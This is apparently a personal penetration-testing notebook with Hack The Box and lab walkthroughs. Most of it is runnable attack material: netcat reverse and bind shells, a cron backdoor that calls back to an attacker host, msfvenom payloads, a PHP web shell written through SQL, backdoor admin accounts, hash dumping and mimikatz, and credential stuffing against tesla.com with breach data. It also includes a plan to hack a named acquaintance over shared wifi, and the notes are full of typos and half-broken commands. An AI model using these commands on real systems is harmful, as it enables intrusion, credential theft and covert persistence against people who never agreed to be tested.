	exploit #will find credential winscp
	
	net command
	===========
	meter>shell
	shell> net users #shows all local users
	C:\Windows\system32> net localgroup Administrators
	backgroud = meterpre
	
	in linux 
	cat .bash_history ###you could find a password
	
	psexec 
	------
	sf > use exploit/windows/smb/psexec
	msf exploit(psexec) > show options
	set rhost
	set smbuser
	set smpass
	exploit
	
	pass hash instead of crack the pass from psexec
	meter> hashdump
	or use 
	msf> use post/windows/gather/hashdump or post/windows/gather/smart_hashdump
	so instead smbpass password #replace password iwth the hash
	
	sshexec
	========
	use exploit/mult/ssh/sshexec
	how optoins
	set rhost
	set username
	set pass
	set payload linux/x86/meter/rev #####in linux
	set lhost your ip
	set hport 
	exploit
	
	meterpreter> getuid
	shell
	whoami
	token impersonation
	----------------
	works on the notion that every remote login generates a token which can be used for authentication after login without asking user to login again
	stealing the token is stealing the account
	meterpre> load incognito 
	> list_tokens -u ## user BOOKXP\georgia
	> impersonate_token  BOOKXP\\secrect \\escape seq
	>getuid ##will give you the server username a confirmation ofsuccessful login
	
	smb capture to bypass hashes if you dont have then
	=================================================
	use axiliary/server/capture/smb
	show options
	set JOHNPWFILE /root/johnfile
	exploit
	
	meterpreter > shell
	C:\Documents and Settings\secret> net use \\192.168.20.9\blah ##connecting to fake something; adn it will give you back the real capture of the said user
	
	
	pivoting to another networ
	---------------------------
	you got a shell on a network
	you run ipconfig and you saw 2 networks
	route add the_other_net_add network_mask ##add it to route
	scan but we can't use nmap but metaspolit have port scanner
	use axiliary/scanner/portscan/tcp
	show options
	set rhost
	exploit ##and it will scan open tcp ports on the pivoted network
	
	smb is seen open
	use exploit/windos/smb/ms08_067_meta ####the vul in xp
	options
	set rhost ip_add_of_the_targe ton diff ne
	##use bind payload for direct connection, reverse wont locate us
	exploit
	
	using other models outside metasploit so as not to limit as
	------------------------------------------------------------
	msf > use auxiliary/server/socks4a 
	msf auxiliary(socks4a) > show options #srvport = 1080
	
	edit proxychains at /etc/proxychains.conf
	# add proxy here ...
	# defaults set to “tor”
	socks4 127.0.0.1 9050 #######chage teh 9050 port to 1080 where we will be lisening
	root@kali:~# proxychains nmap -Pn -sT -sV -p 445,446 172.16.85.190
	#now we can use modules other than metasploit through tor proxy. we using nmap to scan directly from one network to a pivote network
	port 445 was opened is smb
	443 is https
	
	persistence (backdoor)
	------------
	making sure you can get back in another time, or after shutdown since our exploit is in memory
	adduser
	-------
	meterpreter>shell
	C:\Documents and Settings\georgia\Desktop> net user james password /add ##add user james with his password
	C:\Documents and Settings\georgia\Desktop> net localgroup Administrators james /add #add user_james to local group called adminstrors; this allows james all the privi there is
	
	add to domain and then your prefered domain group
	C:\Documents and Settings\georgia\Desktop> net user georgia2 password /add /domain
	C:\Documents and Settings\georgia\Desktop> net group "Domain Admins" georgia2 /add /domain ###create a domain group that you call domain admin and add georgia; you can set the privil you want to this group
	
	metasploit backdor
	-----------------
	meterpreter > run persistence -h ##help from persistence
	meterpreter > run persistence -r 192.168.20.9 -p 2345 -U  #-r attacker machine; -p list port; -u run at boot time
	meterpreter> background ##for it to be listening
	
	use tasksheduler in win and cron job in linux to automate running a script
	*/10 * * * * root nc our_ip port -e /bin/bash ####listen for bash from 12345 where we set a reverse shell to connect to us, every 10 minutes
	
			WEB APP
			=======
	vulnerability scanners burp suit can find vunerabilities
	attack using input fields to send characters or run script into the database
	has proxy to intercept request btw attacker and site
	burp spider for crawling the site
	burp repeater allows manupl of data before sending to site
	
	sql injection
	------------
	works when the developer doest saniize his form fiels
	SELECT username FROM users WHERE username='' or '1'='1' AND password='' or '1'='1'
	//since the or part will always return true we will get at the least the first user in the db
	make a request to one of the items on the site
	example : http://192.168.20.12/bookservice/bookdetail.aspx?id=1' #add a single end quote to full it in to thinking is an sql query; it will fail but we will get important info as to wether we can inject sql
	
	full the db to give you the first database name at the backend
	http://192.168.20.12/bookservice/bookdetail.aspx?id=2 or 1 in (SELECT DB_NAME(0))--
	#erro message with name BookApp
	
	sqlmap for injection
	--------------------
	root@kali:~# sqlmap -u "http://192.168.20.12/bookservice/bookdetail.aspx?id=2" --dump
	#auto generates sql queries for various task
	
	get a shell uing sqlmap through a db
	root@kali:~# sqlmap -u "http://192.168.20.12/bookservice/bookdetail.aspx?id=2" --os-shell


				WIRELESS
		----------------------------------------------------
	you need a wifi around http://192.168.1.1 my router
	and install a wifi card 
	
	root@kali:~# iwconfig #just like ifconfig but for wireless
	root@kali:~# iwlist wlan0 scan #scan to see if you can find our router
			#will give mac address of router
			frequency it's broadcasting
			and wether it is encrypted
			essid
			
	root@kali:~# airmon-ng check #check no process will interfere with us
	root@kali:~# airmon-ng check kill #go ahead and kill all those procss
	root@kali:~# airmon-ng start wlan0 #start wifi card to start monitoring: monitor mode can give use plaintext inforamtio  #put wifi card in promiscous mode to scan traffic other than ones destine to it
	root@kali:~# airodump-ng mon0 --channel 6 #capture packets from router including what other devices are talking with the router
	
			WIRED EQUIVALENT PRIVACY WEP (USES RIVEST CIPHER 4)
			===================================================
	There are multiple ways to crack WEP keys, including the fake authentication attack, fragmentation attack, chopchop attack, caffé latte attack, and PTW attack.

	root@kali:~# airodump-ng -w book mon0 --channel 6 #mon0 wireless mode in monitor mode
-w save as book
	root@kali:~# aireplay-ng -1 0 -e linksys -a 00:23:69:F5:B4:2B -h 00:C0:CA:1B:69:AA mon0			
				-1 tells Aireplay-ng to fake authentication.
			•	 0 is the retransmission time.
			•	 -e is the SSID; in my case linksys.
			•	 -a is the MAC address of the access point we want to authenticate with.
			•	 -h is the MAC address of our card (which should be on a sticker on the 
			device). 
			•	 mon0 is the interface to use for the fake authentication. 

	root@kali:~# aireplay-ng -3 -b 00:23:69:F5:B4:2B -h 00:C0:CA:1B:69:AA mon0
				We use these options:
				•	 -3 performs the ARP request replay attack.
				•	 -b is the base station MAC address.
				•	 -h is our Alfa card MAC address.
				•	 mon0 is the interface.
	ping the ip of the router
	root@kali:~# aircrack-ng -b 00:23:69:F5:B4:2B book*.cap #you should get the key
	
				WPA/WPA2 WIFI PROTECTED ACCESS
				-------------------------------
	root@kali:~# airodump-ng -c 6 --bssid 00:23:69:F5:B4:2B -w pentestbook2 mon0
		•	 -0 means deauthentication.
		•	 1 is the number of deauthentication requests to send.
		•	 -a 00:14:6C:7E:40:80 is the MAC address of the base station.
		•	 -c 00:0F:B5:FD:FB:C2 is the MAC address of the client to deauthenticate. 


	root@kali:~# aireplay-ng -0 1 -a 00:23:69:F5:B4:2B -c 70:56:81:B2:F0:53 mon0

	OPEN saved file with wireshark  > search eapol
	root@kali:~# aircrack-ng -w password.lst -b 00:23:69:F5:B4:2B pentestbook2*.cap #run yoiur .cap file against a wordlist
	
	cracking with bully
	-------------------
	root@kali:~# bully mon0 -b 00:23:69:F5:B4:2B -e linksys -c 6



	
	

	
			take note
			folder = kioptrik
				nmap:
					22
					80
					139
				nikito
					80
					
				subfol= vulnerability
						default web page (low): add the ip address
						use greenshot to take screenshot of the page
						add border, highligght for formating
						paste it in the notes
						
		                                2.server header info disclosure (low)
		                                screenshot
		                                invert black pages
		                                highlight what you want: server etag
		                                
		                                3. default 404 inf disclosure(low) from the erro page
		                                screenshot
		                                boader
		                                highlight wht you want: apache
		                                past here
		                                add boarder
	
						testssl.sh can be used
						4.weak certificate 
						take screenshot
						boarder
						hightlit least strength
						
						5. shadow file saved in a file
						6. nessus csv
								ENUMERATION WEBSITE
								===================
		nmap
		=====
		>nmap -T4 -p- ip addr of site
		>nmap -T4 -A -p 22, 80, 443 ip #returns details of particular ports open
		>nmap -T4 -sU ip ####udp scan
		
		when results are in we begin
		Go to the link http://ip
		view the source code
		check for links
		sometimes we need to edit /etc/hosts
		add the ip and the link url in the source code #changing local dns page
		using the link can also now take you to the same site
		try using ftp or http infront of the link
		also try ftp in terminal
		>sftp onetwoseven.htb
		yes
		>sftp usrname@onetowseven.htb
		confirm password
		sftp>ls
		you locate a file?
		sftp>help #to see options
		sftp>get filename tolocation or #just get filename
		cat filename
		in case you find any link to be appended go ahead and cut that part and append
		serf through the folders
		append a given file to the html and file and upload with up 
		go ahead and browse the page.the file name
		
		
		nikto	
		>nikto -h ip
		or 
		>nikto -h the urllink you found embedded in the source code
		report findings
		
		dirbuster
		to check the dir
		
		burbsuit 
		to check whats coming through with the help of addon
		
		nessus too will work
		
		wraplyzer will give info about the site
		
		
		
								EXPLOIT
		=================================================================================
		netcad port  listener
		=====================
		nc -v ip 80 #test is a particular port is opened
		
		shell and payload types
		you may need one or another
		external pentesting over the internet using bind shell
		reverse shell does not also worl
		
					payload
					=======
		2 types of payload: use to run exploit by sending to a victin to get a shell
			staged windows/meterpreter/reverse_tcp (less stable)
			non-stagged does not alwasy work bc of size windows/meterpreter_reverse_tcp (sent all at ones)
			#shuffle between payloads and changing shells
		
		
			attacher ip = 192.168.1.1
			target ip = 192.168.1.2
			
			Reverse shell with netcad a port connector
			==========================================
			set a port and target connect back to us (95% of the time)
			listening on attacker > nc -lvp 4444
			connnecting on target	> nc 192.168.1.1 4444 -e /bin/sh #or /bin/bash
			
			bind shell
			==========
			open port on target and connect to it
			connecting on attacker  nc 192.168.1.2 4444
			listening on target > nc -lvp 4444 -e /bin/sh
			for external accessment
			
			victim or target
			> nc -lvp 4445 -e /bin/bash 
			listening
			
			attacker
			> nc ip 4445
			connecting
			
			then you start shell commands from your end
					
					
			
		expolitation
		================================================
			his method kioptrix
			====================
				 manual hack and online
				 ======================
				search apache 1.3.20 exploit port 80
				exploit.db #you can download the exploit ; might not work
				cvedetail === chekc ranking and coloring red is critical
				github link to openluck
					follow the instruction to clone and compile any file
					lunch the compiled file
					check your version of hack with ./open and take the 0x87
					./open ox6b ipOfmachine -c 40
					whoami to check if root is successful
					test other command especially sudo and network command
				        cat /etc/shadow
				        cat /etc/passwd to crack the password using hash cracking 			
				        search samba port 139 too in google 
				        repid7 site is good: maker of metasploit. it gives module option on how to use metasploit to do it
				        exploit db again can be good
				        
				metasploit offline
				============================
				>msfconsole
				msf>search smb_version
				   >use auxiliary/scanner/smb/smb_version
				   >info or option
				   >set rhost ip
				   >run gives the expoilt version = samba2.2a and redhart from the nmap scan
	    		           go to google
				   search samba exploit
				   trans2open
				   msf5>search trans2open #select the one that suit your version
				   msf> use exploit/linux/samba/trans2open
				   or msf> use 1 #where 1 is module num
				   msf> set rhost ip #rhost is target
				   msf>show targets #see the options of target that will crack the hack
				   msf>run or exploit ##if problem change payload
				   set payload linux/x86/meterperter/bind_tcp #staged
				   set payload linux/x86/shell_reverse_tcp
				   >option #check options to make sure everything is ok
				   >run
				   whoami #confirms if it went through
				   
				  
				 
				   ANOTHER BOX External
				==========================
				HACK THE BOX == LAMME
				>openvpn m4v3rlck.ovpn
				>nmap -T4 -p- -A ip 
					note the ports opened
						#anonymouse ftp exist 2.3.4 vsftpd google ssh googl smbd3.2.0 exploit
					>ftp ip 
					#password = anonymous
					#name = anonymous
					>ls, help #to see supported commands
					
					metasspoilt
					msfconsole
					search usermap
					use exploit/multi/samba/usermap_script
					option
					set rshost target ip
					run
					whoiam 
					etc/shadow
					
				EXPLOITING WEBDAV ON XAMP WITH CADAVER
				=======================================
		we found xampp has default credential for webvav for uploading to server? do this
		first test if upload is possible with your test file; if that is the case then we can rjun a script
		
		cadaver http://ip_of_apche_server/webdav #####to confirm if active directory is enabed, here we trying to see if webdav (active open) others could be just http://ip
		use default credentials wampp and xampp as pass
		
		so just like linpeas.sh and winpeas.sh attacks to escalate previ but we have to test to see if .php upload is possible witha test.php
		dav:/webdav /> put test.php 
		but here we going to execute standalone payload msfvenom on the target
		to execute php script
		>msfvenom -l payloads ###in msfconsole == show payloads
		root@kali:~# msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.88.128 
LPORT=2323 -f raw > meterpreter.php #######important is php becasue the file is php
		#we also have other payload options to execute files php/download_exec
						       create shell  php/bind_perl
						       get meterpr   php/meterpreter/reverse_tcp
						       
		## to excute this file, we upload meterpreter.php to the server
		dav/> put meterpreter.php //we can also use http.server to setup a server and downlo it in meter
		
		then in msfconsole
		use multi/handler
		set payload php/meterpreter/reverse_tcp
		set lhost
		set lport
		exploit
		
		upload the file to the 
		dav:/wedav/> put meterpreter.php
		or setup a http server in the folder with meter.php
		then downl in target folder in shell
		wget http://ip/filename
		get
		run the file uisng browser by going to the file http://ip/webdav/meterpreter.php
		or chmod the file
		./filename to run
		to get a meterpreter with an escalated privilege
		getuid #to confirm 
		
				SQL INJECTION on database
				=============
		a database server could be running on the system. 
		and since they are running this database beneath the http
		we can get access to the database.sql server can't run without apache or http running
		http://ip/phpmyadmin 
		head to sql tab and inject a sql command to gain remote shell
		SELECT "<script string>" into outfile "path_to_file_on_web_server"
		SELECT "<?php system($_GET['cmd']); ?>" into outfile "C:\\xampp\\htdocs\\shell.php" 
		make it into a file called shell.php and save it the above folder
		windows defender picked it
		
		then open your browser to http://ip/shell.php
		it gives error citing we did provide a cmd param
		so http://ip/shell/php?cmd=ipconfig
		
		#in a internal pentest; you local and so you could try to see if you can gain access
		#most importantly we runned it because it came back as a vulnerability in the sys
		
		COMPROMISED FTP WITH VSFTP 2.3.4 (backdoor)
		=================================
	ftp ip
	name: anyname:) #wwith smiley 
	pass: #anything will work
	
	use netcade to bring back a shell frm target to yourself
	nc ip port
	whoami
	root
	
		LINUX EXPLOIT AFTER EXPORTING FILES (WIHT NFS)
		===================================
		mkdir /tmp/mount #####make a directory on your tmp folder on ur machine
		mout -t nfs -o nolock targetip:/export/geogia /tmp/mount #mount a folder from target exported called geogia to ur machine
		ls
		cd /tmp/mount/.ssh
		ls 
		#you see ssh authorized keys
		ssh-keygen ####gen key to authent fake user found in /root/.ssh/id_rsa.pub and id_rsa
		append our key to georgia's
		cat ./ssh/id_rsa.pub >> /tmp/mount/.ssh/authorized_keys ###adding our publ to georigas folder
		ssh georgia@ip
		
		to copy the geogia keys from the mount to our syste
		cp id_rsa.pub /our folder
		cp id_rsa  /our folder
		ssh-add #add an id
		ssh geogia@ip
		geogia@ubuntu: ##we get a shell
		
				PASSWORD ATTACK
				================
		Possible because:
			1. users use weak pass
			2. leave complex pass in plain text
			3. some pass can be guessed
			4. password resuse by users across multiple sites including bussiness ones
				
				CREDENTIAL STUFFING AND PASSWORD SPRAYING (mostly for external attack) socail media; accounts with login; etc
				=========================================
				injecting stolen or breached account credential and using it with the hope that it will work on a website login
				1. get Breach-Parse from github 1.4billion data
				>breach-parse @tesla.com tesla.txt #wait
				>cat master.txt | "tesla" > tesla-master.txt
				check email patterns
				and repeate emails 
				
				use burp suite *bruteforce
				==============
				install foxy proxy addon
				go to proxy> option and set 127.0.0.1:80
				set same in browser or use addon, foxy proxy
				options>proxy name it; set proxy type; add ip addr and port
				refresh page
				lanch burpsuit through terminal or gui
				if it doesnt work because of cert http://burp
				download cert
				go to settings
				locate cert and import
				tick the first 2
				refresh the page
				turn off foxy proxy
				go to tesla
				click on sign in
				turn on intercept
				cat tesla.txt
				and gedit master tesla file
				turn on intercept on burp suite
				enter test for for username and password on raw tab
				submit and look at the intercept on burp suit
				rightclick and send to repeater entruder to see response in real time; modify it to send get and post requets intruder better than repeater
				you can set the scope of your search to just one url
				go to target>scope>add and type host or target ip to limit your scope
				check the response to see whats coming back
				click the intruder tab then to the second tab ie position
				click on clear
				highlight the username parameter, test and add
				do same with password
				select attack type and select pitchfork (for one to one) or cluster bomb for many to many
				go to payload tab and on position one passed all the emails from breach -parse
				gedit the password file and passed it in 2
				click on start attack
				username against password in pitchfork and only one in snipper
				you can use the comment colum to control tick
				for easy knowledge of failed attempts
				intruder>options>grop-match clear> paste and rerun attack
				
				check the changing length and status code
				check the render in below panel for details of the response
				for a drastic response enter those detail in the login page
				but turn of interception
				
				SPRAYING (you found a password but you dont know the usr)
				=========
				or you suspect one person might use that password
				caareful not to log them out bc its dir attack
				2 at a time (few)
				start from clear above
				email =test and password =somepotentialpassword
				attack type is one hence select sniper attack
				click start attack
				
				   
							ACTIVE DIRECTORY USING 
							======================
		WINDOWS 10 AND WINDOWS SERVER 16
		================================
		created a active directory server on win 16
		create users on the server
		changed the win 10 ip to connect with the domain
		confirms a username set on the server
		in server 16 clikc on files > share > select a folder to share
		then on win 10 map net drive select the folder you are connecting to using ip or server name/folder
		LLMNR/NBT-NS poisoining
		----------------
		happens becasue sometimes there are errors as the client connects to server
		it tries to connect ot the wrong sharefolder
		the server turns down
		the the client sends broadcast asking if anyone knows the failed folder it trying to connect to
		an attacker will respond yes and ask the client to send his hash
		he takes it and breaks it
		
		on kali
			> locate Responder.py #possible becasue of impact installed by default
			his method
			----------
			after getting the shell
			but with no privilege, in order to escalate privileges
			1. turn on responder first bc scans fron nmap or nuessus generate trasffic whihc can give you a hash. do it in the morning or at launch
			>python Responder.py -I eth0 -rdw #internal pentest
			#becasue it's internal every activity on the ip is monitored by responder
			try to request a folder name using ip address which does not exit ofcours on a clinet that has access \\ip
			there a hash will be sent back on responder and it will deny you access fo rsuch a folder bc it does not exist
			the hash comes with username and servername
			>locate rockyou.text
			cd in the folder and unzip it if zipped
			@kali: hashidentifier 
				HASH: pasthash #to confirm if its a harsh
				if hash put it in a file uisng mousepad hash.txt and paste
			> hashcat --h #to see the caterogy your hash falls in
			>hashcat -m 5600 hash.txt --force /root/rockyou.txt #your hash type; your hash and a password respository. append --force for newer cpus on virtual box. graphic card is a must
			other options is john the rizpper or download and extract hashcat for windows
			#if successful with the crack you get a password to the username
DEFENSES TO THIS ATTACK
=======================
1. disable llmnr
2. disaable nbt-ns
or
1.prevent attacker from getting on the network
2. require strong pass. longer the better
			second part where you dont crack the hash offline
			=========================#========================
			apt install crackmapexec #pass hash and smb
			crackmapexec smb targeet_ip -u Admin -p 'password' -d MARVERL #or target_ip/24 #sweeps looking for credential; BEST HASh tool 
			
			on msfconsole
			>use exploit/windows/smb/psexec
			>options
			>set rhost the target machine used to get to the shared folder
			>set smbdomian marvel
			>set smbpass 343343
			>set smbuser fcastel
			>show targets
			>set target 2
			>set target 1
			>run #poweshell work
			>getuid
			#if system
			>sysinfo
			>background
			>option
			>set payload windows/meterprerter
			>sessions
			>sessions 1
			>ps #to see process
			>migrate 1076 #may lose the session and reboot and start over
			>help #what can be done
			go through the help
			>hashdump #will fail shell is 32 but machine is 64
			
			>load incognito #token impersonation when abouve fails helps with getting into a system without providing credential: delegate and impersonate: physical or rdp vs network drives and script
			> list_tokens
			>options
			>list_tokens -u
			or
			>list_tokens -g
			>getiud
			>impersonate_token MARVEL\\Administrator
			#success 
			>getuid
			>shell
			whoamI
			#stolen domain admin account
			>net group "Domain Admin"
			#you create new account and use to login
			meterperter >load #to see what you can load
			>load kiwi #on 64 bite arch
			>help
			>creeds_all
			>rev2self
			>getuid
			>creds_all
			>load mimikatz #32bit system older 32 bit
			>kerberos
			>help
			>Kerberos ##########switiching from meterpreter and msf
			#######switching between psexec and crackmap to login#########
			>background #goes switches from meterpreter to msfconsole
			>sessions #shows msf meterpreter running in the background
			msf> use /post/multi/recon/local_exploit_sugester
			>options
			>set session 1 #see if it leads to anything that may lead ot exploit
			>session 1 #going back to meterperter
			meterpreter>migrate 1076 #in meterpreter
			successfully!
			>sysinfo #confirm switch to 64 bit shell
			>hashdump #to dump all hash :admin, frank,guest
			go to kali terminal
			root@kali>crackmapexect smb 192.168.2022.0/24 -Frank -H "hashdkey" #without the quote
			root@kali>crackmapexect smb 192.168.2022.134 -Frank -H "hashdkey"
			#if it sleeps on you check ping the ip it may have slept or shutdown
			or background from meterpreter to go back to msf
			>background
			msf> use exploit/windows.smb/psexec
			>unset smbdomain
			>set smbuser Frank
			>set smbpass thehashyougot
			>run 
			#host unreachable? ping the ip, it might have died on you or set a target to a diff one
			>set target 2 
			>run
			
			RELAY ATTACK
			==============
			INSTEAD OF CRACKING THE HASH WE SEND THEM TO ANOTHER MACHINE
			if the admin disables some 2 options in security policy only then will this apply
			in gpme.msc
			
			
			case scenario to hack amanu
			===========================
			to get to his machine i need i ip
			to get his ip i do a scan when we share wifi to see source and des ip address communication on the network
			i do a nmap to see open ports
			i search for vulnerability on the result
			i try to get on to the machine or password
			if there's a remote access i access it and enter his details
			then on the shared foler i send a his \\ip while running responder.py to get them to send me his hash
			i crack it offline go ahead and login to have access to the server
			
			copy and past hash
			
			
						ETERNAL BLUE ms17-00: Same as MS08-067
						======================================
			set box as NAT 
			ping to get ip
			
			discovered ms17 
			>msfconsole
			>search ms17 or search enternalblue #auxiliary gives info and exploit breaks it
			>use what we choose num or type the whole url
			set rhost target_ip
			>check #gives same info as the auxiliary model whetehr the target has vulnerability but instead of using auxiliary we using exploit module. so instead of going on to run exploit after setting up an exploit, you can check if it is vulnerable
			
			>set options
			>set ip
		>run #success
			#also change payload #by default payload is 32bit
			>set payload windows/x64/meterperer/reverse_tcp
			>options
			>set lhost yourip
			>show payloads
			>set payload ie meterpreter
			>options #confirm rhosts is still the same
			>run #it might fail the first time but allow it it will keep running until success
			#the second will give you x64bit
			meter> hashdumb #use crack on kali or use psexec 
			>shell
			arp -a #check talking to 
			netstat -ano #incomming connections
			route  
			crt + c
			load incognito #to impersonate #for system on a domain
			list_tokens -u or -g
			load kiwi # x64 mimikatz is x32
			crads__all
			help 
			
			
			manual ms17-101 (you might shutdown a system)
			===============
			search google
			search eternalblue github
			number of starts and date is a must
			
			>git clone giturl
			>cd in the folder
			>follow steps and usage
			>python eternal_checker.py ip #to exploit
			>./shell_prep.sh
			>python eternalblue_exploit7.py ip ....
			
						ACADEMY BOX
						-----------
			He will provide both pass and username
			>dhclient
			ip a #to get the box ip address
			rum nmap
			ftp 21
			ssh 22 
			http 80
			22 difficult unless with bruteforce but password could be weak; alos can you be detected after say manytimes perseconds will be loud
			>ftp ? check ftp below
			summary
			*******************
			setup the box or web
			found the ip using 
			scan with nmap 
			found ftp ssh http
			ftp the ip
			logged in and found a file with a hash
			confirm the hash with hashidentifier
			cracked the hash with hashcat
			used dirb, dirbuster, fuzzy to find diretories on the ip
			goes to that directory and enter the name found in the txt above and with the cracked hash he login
		  					
		  					
		  					PREVILEGE ESALATION
		  					===================
			lfr code exeution using photo upload to upload malicious code
			------------------------------------
			view source code 
			abuse file upload and upload file other than picture
			upload a reverse  malicious code through php of apache
			searh php reverse shell github 
			follow the instruction
			his= copy what he got from github into a file.php
			check your ip
			edit the file to match your details
			setup a listener
			nc -nlvp set_port
			upload the malicious code
			to gain a shell on nc -nlvp port terminal
			whoami #on the listener
			sudo -l #no previleg?
			continue from linpeas***************
			
			******linpeas***********
			if you have no privele you excalate priveleges
			searah linpeas and choose github
			copy the script that will give us information previlege escalation into a file
			mkdir transfer
			cd into folder
			mousepad linpeas.sh and past your code from github
			
			host a server
			python3 -m http.server:80 #hosting a web server in this folder
			servie apahe2 stop #restart in case of problem
			
			download the hosted file into our shell on line 890
			cd /tmp #go to the temp folder, we will download it here
			wget http://yourip/linpease.sh
			ls #to see if download is good
			chmod +x linpeas.sh
			./linpeas.sh #launch and go through the output
			copy important info especially passwords
			
			for important links to files cat to see acconts adn passwords hidden
			his = grimmy is an admin wiht password 
			ssh grimmy@ip
			figerprint? yes to continue
			confirm pass and enter
			check history
			download linpeas and track any change
			cd inot grimmy to see if you find any file
			
			to use chrontab?
			crontab -l #for the current user
			crontab -u root -l  
			crontab -e #cron used to schedule script
			
			systemctl list-timers
			
			if still need info
			ps
			
			us pspy from github 
			downlpoad 64 static version
			follow instruction to install
			mv download to transfer folder above
			cd tmp
			get http://ip/pspy64 to download
			ls
			chmod +x pspy64
			./pspy64 #shows all process running on the machine
			#check if the backup.sh is running
			crt + c back 
			abuse the previlege
			grimm@academy
			cd /home/grimmie
			
			search reverse shell cheat sheet on google
			selech bash option
			edit the one line code to fit yours(port and ip)
			nc -nvlp at_the above port
			open the backup file that is running every minute adn past your bash code above
			go to your listener
			a shell with root should be availble
			cd to see files inside
			
			summary
			=======
			hardly will a pentester go through this
			so after going through now we see that thers an upload of pi
			we abuse it by uplaoding maliious code php reverse shell on github
			we make into a php file and edit the code to match our ip and port
			we set a listener with the port
			we upload adn we get a shell
			unfortunately we got no prevlige
			we download linpeas from github
			set up a server and we download in the shell we got
			we make it exe
			and run looking for red flags
			we found account name and pass ssh
			we log but still no previ
			but we got a bakup file thats running everyminu confirm with pyspy
			we download pspy from github make exe setup a server and down to our temp folder. it confirm backup is running always
			
			so we finally went for bash one line code edited it with our info
			and set a port listener
			put it in a file and run
			shell with root pre returned 
			
						BLACKEARL WAKTHROUGH (VIRTUAL HOST ROUTING)
						=====================
			setup
			scan with nmap
			enumerate 
			ngnix page
			fuzz to see directory
			check source code (web master found embedded in source code)
			one of the direc is secrect so http://ip/secret 
			it says no path through dir
			
			next port 53 dns
			DNSRECON
			scan dns for information
			> dnsrecon -r (range) 127.0.0.0/24 -n ip_add_of_site or box -d (domain) blah
			#found PRT blackperl.tcm 127.0.0.1
			
			open host file and add it to host
			mousepad /etc/hosts
			127.0.0.1 localhost
			127.0.1.1 kali
			192.168.138.130 blackperl.com #when i go to the blackperl take me to that ip infront
			relaunch brow
			http://blackperl.tcm #####not with ip
			fuzz the director again to see if there are other dir hidding
			ffuf -w /************** with blackpearl but not ip
			found dir navigate
			http://blackprl.tcm/navigate
			cms found
			search cms on google 
				metasploit and manual options
			msfconsole
			msf> use exloit/multi/http/naviage_cms_rce
			     set rhosts ip
			     set vhost blackperl.tcm
			     show targets #only auto
			     options
			     run
			     meterperter> shell
			     whoami
			     www-data
			     leads to previlge execution
			     generate a tty shell
			        
			     google 
			     tty shell
			     spaming a tty shell (python prefered)
			     verify python on machine
			     which python #to verify if python was on the machine
			     paste it> python -c 'import pty; pty.spawn("/bin/bash")'
			     you have an actual shell
			     
			     sudo -l #not found
			     history #nothing
			     use linpease
			     host the linpeas
			     download it in the shell
			     run and check for red or red yellow
			     files with password
			     keep checking 
			     backfile could be important
			     unknown suid binaries 
			     -rws even if root, you can execute as non root
			     run> find / .type f -perm -4000 2>/dev/null #search suid folders
			     use the gtfobinss and the the suid scritpt
			     match it will the folder you got above
			     /usr/bin/php7.3 -r paste what you got on suid for php
			     #above code will run it as root
			     cd /root
			     ls
			     open flag.txt
			     whoami
			     
			     
			
						WALKTHROUGH DEV BOX
						===================
			setup 
			scan with nmap
			check the http://ip http://ip:80
			check dir with ffuf, dirb, dirbuster etc
			
			showmount -e ip #search mounted dir
			if dir exist mount on any dir you create
			mkdir /mnt/tmp
			mount -t nfs ip:/mount_dir /mnt/tmp
			cd /mnt/tmp
			ls #to see file inside
			unzip filename.zip 
			no password to unzip? #try to crack it
			apt install fcrackzip
			fcrackzip -v -u -D -p /usr/share/kcrlists/rockyou.txt file.zip #d = dictionary; -u unzip; -p file to crack
			unzip file.zip
			ls
			cat file
			try ssh to see 
			ssh -i id.rsa jp@ip #try to run a ssh 
			ask for a pass?
			
			check http://ip/ any of the directives from dir scan
			http://ip/dev
			yaml file are important
			found boltwire
			search boltwire in google or searchsploit
			go through the page
			/etc/shadow for more info
			account names
			retry ssh with the correct usr name you found
			if ssh asks for pass, you can use john the ripper to crack it
			or bruteforce at ssh somewhere on this file
			OR USE any of the information about the usr here: he loves java
			that is the pass
			unfortuantely no root prev
			check history 
			history cleared?
			sudo -l #shows what you can run with or without password
			zip appears?
			goto gtfobinss>
			selet sudo esc
			then go to zip part
			past the code one by one or put them in a .sh
			
							BUTLER PREVILEGE ESCA
							======================= continues above
			nmap search
			goto url
			genkins?
			searh on google but it needs authentication
			search the default pass of to check default
			port 7680 try telnet or nc
			telnet ip port
			
			((((next we brute force with burp suit))
			the pass and username jerkins jerkins open
			jerkins dashboard
			searched groovy escalation. 
			past it in script console 
                                    ============
			edit the details of ip and port to match your target and reverse shell listner
			set up a listetern with nc to see if you can get a shell
			whoaami 
			not root ? escalat
			sysinfo
			use build to search exploit
					running winpeas
			use winpeas just like linpeas to escalate
			follow the inst on winpeas github
			dowload
			host file sever
			donwload wget into the folder of the target machine
			where you have rwx access c drive root can be
			but since windows you dont use wget but 
			certutil -urlcache -f ip/filename savefilename #to download
			launch savefilename.exe #with red in mind
			wisebootassistant is potential go place
			no quote around a string url; thats a vulnerability for escalation
			also called unqouted service path
			a tool powerup can help summarize the result of the winpeas
			winpeas is the most compressive
			
			put malware 
			msfvenom -p windows/x64/shell_reverse_tcp LHOST=attahker_ip lport=yours -f exe > Wise.exe
			copy wise.exe
			set up a nc -lnvp yours_port
			
			go back to c: and cd into the url without the quote
			download hosted wise.exe 
			stop wiseboot assisstance : google to find out
			sc stop WiseBootAssistance
			sc query WiseBoo...... to  confirm stop
			start WiseBootAssistant
			on your listener you should have a system or root
		
						ACTIVE BOX
						==========
			nmap scan
			result shows active directory
			smb security node
			445 and 139 the first go ports
			anything open is good
			
			using 445
			using smbclient
			>smbclinet -L \\\\ip\\
			anonymous login succes?
			
			see what folders we can connect to
			kali smbclient \\\\ip\\ADMIN$
			enter
			kali smbclient \\\\ip\Replication #gets in
			smb: shell given
			RECURSE ON 
			PROMPT OFF
			mget * #to download files
			crt + c back to download folder and open the xml file
			cd active.htb/policies/31b9iuooi/machine/pref/group.xml
			copy the cpassword in the xml
			kali gpp-decrypt cpassword
			copy that output and keep somewhere
			you can use crackmapexec to see if you can crack it
			or you can go back to smb account and try to login with the credentials you have
			again we can use psexec to see if we can relay the login
			
			#you can also use metasploit
			msf>search gppa .sh
			
			use post/windows/gather/credential/gpp
			>options
			>session 1
			>run
			
                                    KERBEROSTING
                                    ============
                        AN authentication protocol; uses tickets
                        consist of client and server
                        say client want to authenticate demanding ticket
                        if server verify the ticket it encrpt and sent a secreat key that can expire
                        services are spn service principle name
                        for any valid ticket from the server you can attempt to request access to spn
                        
                        is part of the impacket
                        locate GetUserSPNs
                        cd /opt
                        ls
